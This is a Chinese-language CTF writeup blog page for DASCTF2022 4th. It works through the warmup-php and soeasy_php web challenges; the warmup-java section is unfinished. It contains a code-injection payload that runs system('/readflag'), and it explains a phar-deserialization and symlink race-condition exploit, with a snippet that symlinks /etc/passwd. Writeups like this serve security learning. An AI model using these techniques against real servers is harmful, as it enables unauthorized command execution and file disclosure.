@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="warmup-php题目给了4个类，Base、ListView、Filter、TestView，不过Filter没用到，另外三个类从左到右是依次继承的关系 123456789101112131415161718192021 &lt;?phpspl_autoload_register(function($class)&amp;#123;    require(&quot;.&#x2F;class&#x2F;&quot;.$cl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF2022 4th x FATE 防疫挑战赛 Writeup">
+<meta property="og:url" content="http://example.com/2022/05/27/DASCTF2022_4th/index.html">
+<meta property="og:site_name" content="一只安服仔">
+<meta property="og:description" content="warmup-php题目给了4个类，Base、ListView、Filter、TestView，不过Filter没用到，另外三个类从左到右是依次继承的关系 123456789101112131415161718192021 &lt;?phpspl_autoload_register(function($class)&amp;#123;    require(&quot;.&#x2F;class&#x2F;&quot;.$cl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423192055835.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423192248704.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423193220114.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423122439801.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423122428955.png">
+<meta property="article:published_time" content="2022-05-27T03:23:51.371Z">
+<meta property="article:modified_time" content="2022-04-24T07:17:18.223Z">
+<meta property="article:author" content="atao">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423192055835.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>DASCTF2022 4th x FATE 防疫挑战赛 Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="القائمة"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="الأعلى" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/friend/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/27/starCTF2022/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/27/DASCTF2022_3th/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/27/DASCTF2022_4th/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/27/DASCTF2022_4th/&text=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/27/DASCTF2022_4th/&is_video=false&description=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF2022 4th x FATE 防疫挑战赛 Writeup&body=Check out this article: http://example.com/2022/05/27/DASCTF2022_4th/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/27/DASCTF2022_4th/&name=DASCTF2022 4th x FATE 防疫挑战赛 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/27/DASCTF2022_4th/&t=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-php"><span class="toc-number">1.</span> <span class="toc-text">warmup-php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soeasy-php"><span class="toc-number">2.</span> <span class="toc-text">soeasy_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-java"><span class="toc-number">3.</span> <span class="toc-text">warmup-java</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DASCTF2022 4th x FATE 防疫挑战赛 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">atao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-27T03:23:51.371Z" itemprop="datePublished">2022-05-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Web/" rel="tag">Web</a>, <a class="tag-link-link" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+	  
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h3><p>题目给了4个类，<code>Base</code>、<code>ListView</code>、<code>Filter</code>、<code>TestView</code>，不过<code>Filter</code>没用到，另外三个类从左到右是依次继承的关系</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(function(<span class="variable">$class</span>)&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Action</span>(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>创建一个类，然后给类中变量进行赋值，最后触发类的<code>run()</code>函数，知道了入口点就好做了</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ListView.run()</span><br><span class="line">↓↓↓</span><br><span class="line">ListView.renderContent()</span><br><span class="line">↓↓↓</span><br><span class="line">ListView.renderSection(<span class="variable">$matches</span>)</span><br><span class="line">↓↓↓</span><br><span class="line">TestView.renderTableBody()</span><br><span class="line">↓↓↓</span><br><span class="line">TestView.renderTableRow(<span class="variable">$row</span>)</span><br><span class="line">↓↓↓</span><br><span class="line">Base.evaluateExpression(<span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=array())</span><br></pre></td></tr></table></figure>
+
+<p>有2点需要注意的：</p>
+<ol>
+<li><code>preg_replace_callback</code>函数的正则表达式是<code>&#123;(\w+)&#125;</code>，所以传入的<code>template</code>需要带上<code>&#123;&#125;</code></li>
+<li>在<code>renderTableBody</code>函数中需要类中的<code>data</code>变量有值，才会进<code>renderTableRow($row)</code>函数</li>
+</ol>
+<p>最后Payload如下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://2d63ba8a-34a4-453a-acfe-c73862f9a4bb.node4.buuoj.cn:81/?action=TestView</span><br><span class="line">POST</span><br><span class="line">properties[template]=&#123;TableBody&#125;&amp;properties[data]=1&amp;properties[rowHtmlOptionsExpression]=system(<span class="string">&#x27;/readflag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423192055835.png" alt="image-20220423192055835"></p>
+<h3 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h3><p>查看源码可以看到还有一个<code>edit.php</code>的文件，利用该文件读取源代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423192248704.png" alt="image-20220423192248704"></p>
+<p><strong>edit.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">copyflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">sleep</span>(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">filewrite</span>(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">symlink</span>(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>flag.copyflag</code>可以将<code>/flag</code>赋给<code>/tmp/flag.txt</code>，这里需要触发类的话就要使用<code>phar</code>协议，因为都是文件处理的函数</p>
+<p>调用<code>filewrite</code>函数的地方基本都固定了文件名，可以直接抛弃了，那么就需要把导致<code>symlink($filename, $head)</code>返回<code>False</code>进入<code>else</code>语句来触发<code>Phar</code>协议了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;123.php&quot;</span>, <span class="string">&quot;&lt;?php echo(123);?&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">symlink</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;123.php&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用上述代码进行测试(<strong>在Linux环境下</strong>)，效果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423193220114.png" alt="image-20220423193220114"></p>
+<p>但是在<code>symlink</code>之前有个<code>unlink($head);</code>，说明需要条件竞争一下来绕过</p>
+<p>构造条件竞争的表达式也十分固定，只能有<code>..//../../../../../../../tmp/flag.txt</code>和<code>phar://uploads/上传的Phar文件</code>构成，并且<code>phar://uploads/上传的Phar文件</code>必须是最后一个</p>
+<p>解释一下它为啥是最后一个，由于需要上传<code>$_POST[&#39;flag&#39;]</code>才能进入到第二段<code>if</code>语句中，而进入后传参的<code>$_POST[&#39;flag&#39;]</code>又会被写到<code>/tmp/flag.txt</code>，如果<code>payload</code>不是在最后一个那么会<code>/tmp/flag.txt</code>被覆盖</p>
+<p>前面都是使用<code>..//../../../../../../../tmp/flag.txt</code>的原因：只有链接的是<code>/tmp/flag.txt</code>文件，才能通过<code>uploads/head.png</code>读到flag，如果来接到别的上，虽然可以成功执行<code>phar</code>协议，但是你在更换链接时又会导致<code>/tmp/flag.txt</code>内容被覆盖</p>
+<p>最后一点：需要网络好一点，成功的概率就会高一点，这里只能多试几次！！！玄学拉满了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423122439801.png" alt="image-20220423122439801"></p>
+<p>在成功后，会显示<code>SFTQL</code>的字样，最后访问<code>uploads/head.png</code>即可获得flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/erRORatao/Blog-images@master/images/image-20220423122428955.png" alt="image-20220423122428955"></p>
+<h3 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h3><p>做不出来，等有时间了再补充完成吧。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friend/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-php"><span class="toc-number">1.</span> <span class="toc-text">warmup-php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#soeasy-php"><span class="toc-number">2.</span> <span class="toc-text">soeasy_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup-java"><span class="toc-number">3.</span> <span class="toc-text">warmup-java</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/27/DASCTF2022_4th/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/27/DASCTF2022_4th/&text=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/27/DASCTF2022_4th/&is_video=false&description=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF2022 4th x FATE 防疫挑战赛 Writeup&body=Check out this article: http://example.com/2022/05/27/DASCTF2022_4th/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/27/DASCTF2022_4th/&title=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/27/DASCTF2022_4th/&name=DASCTF2022 4th x FATE 防疫挑战赛 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/27/DASCTF2022_4th/&t=DASCTF2022 4th x FATE 防疫挑战赛 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2022
+    atao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/friend/">友链</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
